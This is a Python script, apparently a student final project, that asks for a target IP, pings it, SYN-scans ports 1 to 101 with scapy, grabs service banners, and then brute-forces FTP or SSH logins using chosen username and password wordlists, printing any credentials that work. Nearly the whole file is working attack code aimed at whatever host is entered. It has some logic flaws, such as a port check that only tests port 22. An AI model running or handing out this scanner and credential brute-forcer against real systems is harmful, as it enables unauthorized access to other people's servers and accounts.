from scapy.all import *
from scapy.layers.inet import TCP,IP,ICMP
import socket
import tkinter as tk
from tkinter import filedialog
import ftplib
import paramiko
import time
global s

print("""
______        _    _                                              
| ___ \      | |  | |                                             
| |_/ /_   _ | |_ | |__    ___   _ __                             
|  __/| | | || __|| '_ \  / _ \ | '_ \                            
| |   | |_| || |_ | | | || (_) || | | |                           
\_|    \__, | \__||_| |_| \___/ |_| |_|                           
        __/ |                                                     
       |___/                                                      
______  _                _  ______             _              _   
|  ___|(_)              | | | ___ \           (_)            | |  
| |_    _  _ __    __ _ | | | |_/ /_ __  ___   _   ___   ___ | |_ 
|  _|  | || '_ \  / _` || | |  __/| '__|/ _ \ | | / _ \ / __|| __|
| |    | || | | || (_| || | | |   | |  | (_) || ||  __/| (__ | |_ 
\_|    |_||_| |_| \__,_||_| \_|   |_|   \___/ | | \___| \___| \__|
                                             _/ |                 
                                            |__/              
    
    """)
target = input('Enter Target IP: ')
ports = range(1,102)
open_ports = []
service_list = []


def icmp_check(target):
    try:
        sr1(IP(dst=target)/ICMP(),timeout=3)
        return True
    except:
        return False


def port_scan(port):
    x = (IP(dst=target) / TCP(dport=port, flags='S'))
    rec, wrong = sr(x, timeout=0.5, verbose=0)

    if rec:
        data = '{}'.format(rec[0]).split(" ")[7][6:]
        if data.isnumeric():
            pass
        else:
            print('\t\t- port {} , service = {}'.format(port, data))
            open_ports.append(port)
        x = (IP(dst=target) / TCP(dport=[port], flags='R'))
        rec, wrong = sr(x, timeout=0.5, verbose=0)
        if rec:
            pass
        else:
            pass




def banner_grab():
    global s
    print('[+] Trying To Grab Banners\n')
    for port in open_ports:
        try:
            s = socket.socket()
            s.connect((target, port))
            s.settimeout(18)
            banner = (s.recv(20480).decode())
            service_list.append(banner)
            time.sleep(1)
            print("[+] Port {} is open running service: {} ".format(port, banner))
        except:
            pass
        finally:
            s.close()
    time.sleep(2)
    print("[-] Done scanning")
    time.sleep(1)

def bruteforce():
    if len(open_ports) == 0:
        print('\n[!] There is no open ports to attack')
        print('Bye Bye ...')
        exit()

    print('\n[+] This is are all the open ports on the remote host:\n\t\t\t - {} \n\tand its all banner we could get service '
          '\n\t\t\t -{} '.
          format(str(open_ports).strip('[]'), str(service_list).strip('[]').replace('\\r\\n', '').strip("'").strip("'")))
    time.sleep(1)
    if 21 and 22 in open_ports:
        print('''\n[!] For now we can brute force only this two service ftp and ssh
    it look like the remote host is running this services''')
        user = input('\ndo you want to attack (Y/N)? ').lower()
        if user == 'y':
            print('''Please select the service to brute force
    1.FTP
    2.SSH
            ''')
            user = int(input('Please select number '))
            if user == 1:
                root = tk.Tk()
                root.withdraw()
                print("[+] Chose a username file")
                path_to_user_list = filedialog.askopenfilename()

                print("[+] Chose a password file\n")
                path_to_password_list = filedialog.askopenfilename()

                password_file = open(path_to_password_list, "r")
                password_list = password_file.read()
                password = password_list.splitlines()

                user_name_file = open(path_to_user_list, "r")
                user = user_name_file.read()
                first_user = user.splitlines()


                def ftp_login(user_name, passwd):
                    server = ftplib.FTP()
                    server.connect(target, port=21)
                    server.login(user=user_name, passwd=passwd)
                    server.close()


                print('Attacking FTP\n')
                for i in range(len(first_user)):
                    for x in range(len(password)):
                        try:

                            print('[!] Trying user:{}, password:{}'.format(first_user[i], password[x]))
                            ftp_login(first_user[i], password[x])
                            print("\n***** FOUND *****")
                            print("[+] User name: {}\n[+] Password: {}\n".format(first_user[i], password[x]))
                        except:
                            print('Nope that is not the right one trying again\n')
            elif user == 2:
                root = tk.Tk()
                root.withdraw()
                print("[+] Chose a username file")
                path_to_user_list = filedialog.askopenfilename()

                print("[+] Chose a password file\n")
                path_to_password_list = filedialog.askopenfilename()

                password_file = open(path_to_password_list, "r")
                password_list = password_file.read()
                password = password_list.splitlines()

                user_name_file = open(path_to_user_list, "r")
                user = user_name_file.read()
                first_user = user.splitlines()


                def ssh_login(user_name, passwd):
                    ssh = paramiko.SSHClient()
                    ssh.load_system_host_keys()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=target, port=22, username=user_name, password=passwd)
                    ssh.close()

                print('Attacking SSH\n')
                for i in range(len(first_user)):
                    for x in range(len(password)):
                        try:
                            print('[!] Trying user name: {}, password: {}'.format(first_user[i], password[x]))
                            ssh_login(first_user[i], password[x])
                            print("\n***** FOUND *****")
                            print("[+] User name: {}\n[+] Password: {}\n".format(first_user[i], password[x]))
                        except:
                            print('Nope that is not the right one trying again\n')
    else:
        print('Cant find ftp or ssh service soi cant help you for now sorry =( ')


def main():
    if icmp_check(target) == True:
        print('\n[+] Start Scanning..')
        print('\t[!] Open ports: ')
        for port in ports:
            port_scan(port)
        grab =input('[+] Do you wnat to grab Banners? (Y/n): ').lower()
        if grab == 'y':
            banner_grab()
            bruteforce()
        else:
            bruteforce()
    else:
        print('Host dosent replay to ping')
        print("[-] This is an unknown host can't scan it..")
        exit()
if __name__ == '__main__':
    main()
